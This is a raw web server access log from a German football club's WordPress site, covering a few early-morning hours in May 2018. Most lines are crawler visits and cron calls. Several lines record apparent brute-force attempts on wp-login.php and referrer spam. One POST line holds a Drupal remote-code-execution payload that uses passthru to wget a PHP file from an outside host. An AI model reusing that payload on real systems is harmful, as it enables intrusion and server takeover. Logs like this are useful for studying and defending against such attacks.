40.77.188.54 - - [13/May/2018:00:03:32 +0200] "GET /wp-content/themes/fcs/css/jquery.smartmenus.bootstrap.css?ver=1418749976 HTTP/1.1" 200 3128 www.fc-schnaittach.de "https://www.fc-schnaittach.de/karate/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "-"
77.75.79.119 - - [13/May/2018:00:05:18 +0200] "GET /robots.txt HTTP/1.1" 200 35 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
2a02:598:a::79:119 - - [13/May/2018:00:05:18 +0200] "GET /ansprechpartner/fussball/ HTTP/1.1" 200 8166 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
77.75.79.119 - - [13/May/2018:00:05:20 +0200] "GET /robots.txt HTTP/1.1" 301 248 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
2a02:598:a::79:119 - - [13/May/2018:00:05:20 +0200] "GET /f3-jugend-2/ HTTP/1.1" 200 6890 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://napoveda.seznam.cz/en/seznambot-intro/)" "-"
66.249.64.207 - - [13/May/2018:00:06:24 +0200] "GET / HTTP/1.1" 200 7771 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.207 - - [13/May/2018:00:09:43 +0200] "GET /sitemap-pt-page-2015-06.xml HTTP/1.1" 200 609 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
157.55.39.139 - - [13/May/2018:00:12:11 +0200] "GET /wp-content/uploads/2015/04/ManfredHofmannEhrenmitglied.jpg HTTP/1.1" 301 296 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.139 - - [13/May/2018:00:12:13 +0200] "GET /wp-content/uploads/2015/04/ManfredHofmannEhrenmitglied.jpg HTTP/1.1" 200 146873 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
194.187.170.130 - - [13/May/2018:00:15:50 +0200] "GET /robots.txt HTTP/1.1" 301 248 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
194.187.170.130 - - [13/May/2018:00:15:50 +0200] "GET /robots.txt HTTP/1.1" 200 35 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
217.160.63.10 - - [13/May/2018:00:15:50 +0200] "POST /wp-cron.php?doing_wp_cron=1526163350.9077029228210449218750 HTTP/1.1" 301 297 www.fc-schnaittach.de "http://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526163350.9077029228210449218750" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
194.187.170.130 - - [13/May/2018:00:15:50 +0200] "GET /fussball/1-mannschaft/facebook-news/ HTTP/1.1" 200 6924 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
194.187.170.130 - - [13/May/2018:00:16:22 +0200] "GET /tag/jahresfahrt/ HTTP/1.1" 200 5693 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
157.55.39.183 - - [13/May/2018:00:16:24 +0200] "GET /sitemap_index.xml HTTP/1.1" 200 527 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.160.63.10 - - [13/May/2018:00:17:39 +0200] "POST /wp-cron.php?doing_wp_cron=1526163459.2483808994293212890625 HTTP/1.1" 200 23 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526163459.2483808994293212890625" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
66.249.64.205 - - [13/May/2018:00:17:39 +0200] "GET /dragonrun/ HTTP/1.1" 200 9134 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
157.55.39.183 - - [13/May/2018:00:21:17 +0200] "GET /wp-content/uploads/2014/10/Christian_Gulitsch.jpg HTTP/1.1" 200 1948054 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
77.93.109.10 - - [13/May/2018:00:22:35 +0200] "GET /wp-login.php HTTP/1.1" 301 250 fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
217.160.63.10 - - [13/May/2018:00:22:47 +0200] "POST /wp-cron.php?doing_wp_cron=1526163767.2708721160888671875000 HTTP/1.1" 200 23 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526163767.2708721160888671875000" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
77.93.109.10 - - [13/May/2018:00:22:47 +0200] "GET /wp-login.php HTTP/1.1" 200 2793 www.fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
77.93.109.10 - - [13/May/2018:00:22:59 +0200] "POST /wp-login.php HTTP/1.1" 503 299 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-login.php" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
157.55.39.87 - - [13/May/2018:00:23:28 +0200] "GET /fcs-ii-fc-roethenbach-10-17-03-2018/ HTTP/1.1" 200 7865 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
35.205.163.213 - - [13/May/2018:00:23:40 +0200] "GET /wp-content/plugins/feedzy-rss-feeds/img/feedzy.png HTTP/1.1" 301 288 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
35.205.163.213 - - [13/May/2018:00:23:40 +0200] "GET /wp-content/plugins/feedzy-rss-feeds/img/feedzy.png HTTP/1.1" 200 447 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
178.137.165.61 - - [13/May/2018:00:30:22 +0200] "GET /karate-teilnahme-an-der-bezirksmeisterschaft-2015/ HTTP/1.1" 200 29768 www.fc-schnaittach.de "http://incitystroy.ru/" "Opera/7.11 (Windows NT 5.1; U) [en]" "-"
178.137.165.61 - - [13/May/2018:00:30:24 +0200] "GET /karate-teilnahme-an-der-bezirksmeisterschaft-2015/ HTTP/1.1" 200 29768 www.fc-schnaittach.de "http://incitystroy.ru/" "Opera/7.11 (Windows NT 5.1; U) [en]" "-"
212.175.77.165 - - [13/May/2018:00:32:36 +0200] "GET /wp-login.php HTTP/1.1" 301 250 fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
212.175.77.165 - - [13/May/2018:00:32:48 +0200] "GET /wp-login.php HTTP/1.1" 200 2793 www.fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
212.175.77.165 - - [13/May/2018:00:33:00 +0200] "POST /wp-login.php HTTP/1.1" 503 299 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-login.php" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
194.187.170.130 - - [13/May/2018:00:35:51 +0200] "GET /tag/runterra/ HTTP/1.1" 200 5692 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
54.36.148.165 - - [13/May/2018:00:39:51 +0200] "GET /wp-content/uploads/2015/04/P4197688.jpg HTTP/1.1" 301 277 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
66.249.64.200 - - [13/May/2018:00:51:23 +0200] "GET /tag/osterlehrgang/ HTTP/1.1" 200 5697 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
194.187.170.130 - - [13/May/2018:00:52:23 +0200] "GET /hauptverein/vereinsbus/ HTTP/1.1" 200 7088 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
194.187.170.130 - - [13/May/2018:00:54:01 +0200] "GET /tag/wanderabteilung/ HTTP/1.1" 200 5697 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
157.55.39.39 - - [13/May/2018:00:54:59 +0200] "GET /wp-content/uploads/2014/10/F_Wazlav.jpg HTTP/1.1" 301 277 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.39 - - [13/May/2018:00:55:02 +0200] "GET /wp-content/uploads/2014/10/F_Wazlav.jpg HTTP/1.1" 200 109466 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
54.36.149.25 - - [13/May/2018:01:04:56 +0200] "GET /budo/zeitungsbericht-pegnitzzeitung/ HTTP/1.1" 200 6059 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
157.55.39.139 - - [13/May/2018:01:06:34 +0200] "GET /wp-content/uploads/2014/10/C_Leupold.jpg HTTP/1.1" 301 278 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.139 - - [13/May/2018:01:06:37 +0200] "GET /wp-content/uploads/2014/10/C_Leupold.jpg HTTP/1.1" 200 127578 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
66.249.64.200 - - [13/May/2018:01:07:49 +0200] "GET /wp-content/plugins/recently-updated-posts-widget/css/style.css?ver=4.9.5 HTTP/1.1" 301 310 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/osterlehrgang/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.200 - - [13/May/2018:01:07:49 +0200] "GET /wp-content/plugins/user-access-manager/assets/css/uamLoginForm.css?ver=2.1.11 HTTP/1.1" 301 315 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/osterlehrgang/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.198 - - [13/May/2018:01:07:50 +0200] "GET /wp-includes/js/wp-embed.min.js?ver=4.9.5 HTTP/1.1" 301 278 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/osterlehrgang/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.198 - - [13/May/2018:01:07:50 +0200] "GET /wp-content/plugins/feedzy-rss-feeds/css/feedzy-rss-feeds.css?ver=3.2.10 HTTP/1.1" 301 309 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/osterlehrgang/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.203 - - [13/May/2018:01:07:53 +0200] "GET /wp-content/plugins/recently-updated-posts-widget/css/style.css?ver=4.9.5 HTTP/1.1" 200 45 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/osterlehrgang/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.205 - - [13/May/2018:01:07:54 +0200] "GET /wp-content/plugins/user-access-manager/assets/css/uamLoginForm.css?ver=2.1.11 HTTP/1.1" 200 468 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/osterlehrgang/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.203 - - [13/May/2018:01:07:55 +0200] "GET /wp-includes/js/wp-embed.min.js?ver=4.9.5 HTTP/1.1" 200 1398 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/osterlehrgang/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.203 - - [13/May/2018:01:07:56 +0200] "GET /wp-content/plugins/feedzy-rss-feeds/css/feedzy-rss-feeds.css?ver=3.2.10 HTTP/1.1" 200 9822 www.fc-schnaittach.de "http://www.fc-schnaittach.de/tag/osterlehrgang/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
40.77.167.127 - - [13/May/2018:01:08:13 +0200] "GET /wp-content/uploads/2017/06/Sporterlebnistag_04-4.jpg HTTP/1.1" 301 290 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
40.77.167.127 - - [13/May/2018:01:08:52 +0200] "GET /wp-content/uploads/2017/06/Sporterlebnistag_04-4.jpg HTTP/1.1" 200 247821 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.160.63.10 - - [13/May/2018:01:10:24 +0200] "POST /wp-cron.php?doing_wp_cron=1526166624.5432999134063720703125 HTTP/1.1" 301 297 www.fc-schnaittach.de "http://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526166624.5432999134063720703125" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
66.249.64.198 - - [13/May/2018:01:10:24 +0200] "GET /sitemap-pt-post-2017-10.xml HTTP/1.1" 200 595 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
35.205.233.18 - - [13/May/2018:01:10:49 +0200] "GET /wp-content/uploads/2016/11/FCS_MW41076_online.jpg HTTP/1.1" 301 287 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
35.205.233.18 - - [13/May/2018:01:10:49 +0200] "GET /wp-content/uploads/2016/11/FCS_MW41076_online.jpg HTTP/1.1" 200 480662 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
194.187.170.130 - - [13/May/2018:01:20:08 +0200] "GET /category/news/fussball/page/2/ HTTP/1.1" 200 7571 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
217.160.63.10 - - [13/May/2018:01:20:09 +0200] "POST /wp-cron.php?doing_wp_cron=1526167209.1549959182739257812500 HTTP/1.1" 301 297 www.fc-schnaittach.de "http://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526167209.1549959182739257812500" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
157.55.39.139 - - [13/May/2018:01:27:42 +0200] "GET /wp-content/uploads/2015/04/ManfredHofmannEhrenmitglied.jpg HTTP/1.1" 301 296 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.139 - - [13/May/2018:01:27:45 +0200] "GET /wp-content/uploads/2015/04/ManfredHofmannEhrenmitglied.jpg HTTP/1.1" 200 146873 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.160.63.10 - - [13/May/2018:01:30:33 +0200] "POST /wp-cron.php?doing_wp_cron=1526167833.6894040107727050781250 HTTP/1.1" 200 23 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526167833.6894040107727050781250" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
157.55.39.39 - - [13/May/2018:01:30:33 +0200] "GET /ehrenabend-beim-1-fc-schnaittach/ HTTP/1.1" 200 8103 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
40.77.167.127 - - [13/May/2018:01:36:26 +0200] "GET /wp-content/uploads/2016/11/Marlene-Walther.jpg HTTP/1.1" 301 284 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
40.77.167.127 - - [13/May/2018:01:36:26 +0200] "GET /wp-content/uploads/2016/11/Marlene-Walther.jpg HTTP/1.1" 200 1068200 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.165 - - [13/May/2018:01:40:46 +0200] "GET /fussball/1-mannschaft/dsc03526/ HTTP/1.1" 200 196 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
54.36.149.43 - - [13/May/2018:01:48:14 +0200] "GET /wp-content/uploads/2015/08/IMG_6470.jpg HTTP/1.1" 301 277 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" "-"
66.249.64.200 - - [13/May/2018:01:50:53 +0200] "GET /sitemap-pt-contactperson-2017-05.xml HTTP/1.1" 200 493 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
5.45.203.17 - - [13/May/2018:01:58:33 +0200] "GET /robots.txt HTTP/1.1" 301 248 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
66.249.64.203 - - [13/May/2018:01:59:43 +0200] "GET /fussball/damen/mannschaft/ HTTP/1.1" 200 9182 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.205 - - [13/May/2018:02:01:25 +0200] "GET /tag/osterlehrgang/feed/ HTTP/1.1" 200 597 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.198 - - [13/May/2018:02:04:16 +0200] "GET /sitemap-pt-nav_menu_item-2015-03.xml HTTP/1.1" 200 492 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
194.187.170.130 - - [13/May/2018:02:06:50 +0200] "GET /tag/trainer/ HTTP/1.1" 200 5693 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
194.187.170.130 - - [13/May/2018:02:09:56 +0200] "GET /tag/spende/ HTTP/1.1" 200 5691 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
194.187.170.130 - - [13/May/2018:02:16:04 +0200] "GET /tag/kickboxen/ HTTP/1.1" 200 5691 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
66.249.64.207 - - [13/May/2018:02:17:13 +0200] "GET / HTTP/1.1" 200 7770 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
35.195.170.116 - - [13/May/2018:02:30:06 +0200] "GET /wp-content/uploads/2015/06/WP_20150626_16_08_02_Pro-150x150.jpg HTTP/1.1" 200 7856 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
81.213.246.140 - - [13/May/2018:02:32:01 +0200] "GET /wp-content/uploads/2014/10/P1160487.jpg HTTP/1.1" 301 277 www.fc-schnaittach.de "http://www.namenfinden.de/s/salih+deniz" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" "-"
81.213.246.140 - - [13/May/2018:02:32:02 +0200] "GET /wp-content/uploads/2014/10/P1160487.jpg HTTP/1.1" 200 487239 www.fc-schnaittach.de "http://www.namenfinden.de/s/salih+deniz" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" "-"
157.55.39.39 - - [13/May/2018:02:33:05 +0200] "GET /wp-content/uploads/2014/10/1-Mannschaft.jpg HTTP/1.1" 301 281 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.39 - - [13/May/2018:02:33:19 +0200] "GET /wp-content/uploads/2014/10/1-Mannschaft.jpg HTTP/1.1" 200 131250 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.135 - - [13/May/2018:02:34:12 +0200] "GET /wp-content/uploads/2014/10/S_Huff.jpg HTTP/1.1" 301 275 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.135 - - [13/May/2018:02:34:14 +0200] "GET /wp-content/uploads/2014/10/S_Huff.jpg HTTP/1.1" 200 119395 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.160.63.10 - - [13/May/2018:02:35:56 +0200] "HEAD /wp-content/uploads/2018/04/Gel%C3%A4ndekarte_Homepage_1-1.png HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
66.249.64.205 - - [13/May/2018:02:35:56 +0200] "GET / HTTP/1.1" 200 7771 www.fc-schnaittach.de "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
217.160.63.10 - - [13/May/2018:02:35:56 +0200] "POST /wp-cron.php?doing_wp_cron=1526171756.3068549633026123046875 HTTP/1.1" 200 23 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526171756.3068549633026123046875" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
217.160.63.10 - - [13/May/2018:02:35:58 +0200] "HEAD /wp-content/uploads/2018/04/Gel%C3%A4ndekarte_Homepage_1-1-1024x665.png HTTP/1.1" 200 - www.fc-schnaittach.de "https://www.fc-schnaittach.de" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
77.88.9.138 - - [13/May/2018:02:40:16 +0200] "GET /wp-content/themes/fcs/images/production/FcsWappenMobileBookmark.png?ver=1487205003 HTTP/1.1" 301 320 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
77.88.9.137 - - [13/May/2018:02:40:17 +0200] "GET /robots.txt HTTP/1.1" 200 35 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
87.250.233.77 - - [13/May/2018:02:40:20 +0200] "GET /wp-content/themes/fcs/images/production/FcsWappenMobileBookmark.png?ver=1487205003 HTTP/1.1" 200 12628 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
105.96.8.118 - - [13/May/2018:02:51:15 +0200] "GET /wp-login.php HTTP/1.1" 200 1203 fc-schnaittach.de "https://www.google.com" "Mozilla/5.0 (Windows NT 6.0; rv:33.0) Gecko/20100101 Firefox/33.0" "-"
105.96.8.118 - - [13/May/2018:02:51:27 +0200] "POST /wp-login.php HTTP/1.1" 200 1616 fc-schnaittach.de "https://www.google.com" "Mozilla/5.0 (Windows NT 6.0; rv:33.0) Gecko/20100101 Firefox/33.0" "-"
138.201.191.144 - - [13/May/2018:02:53:26 +0200] "POST /?q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=wget+https%3A%2F%2Fraw.githubusercontent.com%2Fworldexploit%2Ftr%2Fmaster%2Fizom.php HTTP/1.1" 503 299 www.fc-schnaittach.de "-" "python-requests/2.18.4" "-"
207.46.13.165 - - [13/May/2018:02:56:10 +0200] "GET /ansprechpartner/verein/ HTTP/1.1" 200 7074 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
194.187.170.130 - - [13/May/2018:02:56:48 +0200] "GET /tag/budo/ HTTP/1.1" 200 6191 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w" "-"
188.165.200.217 - - [13/May/2018:03:01:18 +0200] "HEAD / HTTP/1.1" 301 - fc-schnaittach.de "-" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" "-"
207.46.13.165 - - [13/May/2018:03:06:31 +0200] "GET /wp-content/uploads/2015/04/2-Mannschaft-1960-1.jpg HTTP/1.1" 301 288 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.165 - - [13/May/2018:03:06:36 +0200] "GET /wp-content/uploads/2015/04/2-Mannschaft-1960-1.jpg HTTP/1.1" 200 44696 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
66.249.64.207 - - [13/May/2018:03:08:42 +0200] "GET /wp-content/themes/fcs/style.css?ver=1460744932 HTTP/1.1" 200 22587 www.fc-schnaittach.de "https://www.fc-schnaittach.de/unterstuetzt-unsere-mannschaften/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
35.195.30.25 - - [13/May/2018:03:10:59 +0200] "GET /wp-content/uploads/2014/10/Cosmin_Mihaes.jpg HTTP/1.1" 200 1208830 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; tracemyfile/1.0; +bot@tracemyfile.com)" "-"
62.133.162.145 - - [13/May/2018:03:13:32 +0200] "GET /wp-login.php HTTP/1.1" 301 250 fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.133.162.145 - - [13/May/2018:03:13:45 +0200] "GET /wp-login.php HTTP/1.1" 200 2793 www.fc-schnaittach.de "-" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
62.133.162.145 - - [13/May/2018:03:13:57 +0200] "POST /wp-login.php HTTP/1.1" 503 299 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-login.php" "Mozilla/5.0 (Windows NT 6.0; rv:34.0) Gecko/20100101 Firefox/34.0" "-"
157.55.39.87 - - [13/May/2018:03:20:54 +0200] "GET /wp-content/uploads/2016/11/Jasmin-M%C3%BCller.jpg HTTP/1.1" 301 287 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.87 - - [13/May/2018:03:20:56 +0200] "GET /wp-content/uploads/2016/11/Jasmin-M%c3%bcller.jpg HTTP/1.1" 200 955116 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
185.209.20.147 - - [13/May/2018:03:29:54 +0200] "HEAD / HTTP/1.1" 301 - www.fc-schnaittach.de "https://xn----7sbabm1ahc4b2aqff.su/%D0%BF%D0%B8%D0%BB%D0%BE%D0%BC%D0%B0%D1%82%D0%B5%D1%80%D0%B8%D0%B0%D0%BB%D1%8B/%D0%B8%D0%BC%D0%B8%D1%82%D0%B0%D1%86%D0%B8%D1%8F-%D0%B1%D1%80%D1%83%D1%81%D0%B0/" "Mozilla/4.0 (compatible; MSIE3.00; Windows 2006)" "-"
217.160.63.10 - - [13/May/2018:03:30:29 +0200] "POST /wp-cron.php?doing_wp_cron=1526175029.7153809070587158203125 HTTP/1.1" 200 23 www.fc-schnaittach.de "https://www.fc-schnaittach.de/wp-cron.php?doing_wp_cron=1526175029.7153809070587158203125" "WordPress/4.9.5; https://www.fc-schnaittach.de" "-"
66.249.64.203 - - [13/May/2018:03:30:29 +0200] "GET / HTTP/1.1" 200 7770 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
207.46.13.165 - - [13/May/2018:03:32:36 +0200] "GET /wp-content/uploads/2016/11/Stefanie-Panusch.jpg HTTP/1.1" 301 285 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.165 - - [13/May/2018:03:32:44 +0200] "GET /wp-content/uploads/2016/11/Stefanie-Panusch.jpg HTTP/1.1" 200 883473 www.fc-schnaittach.de "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
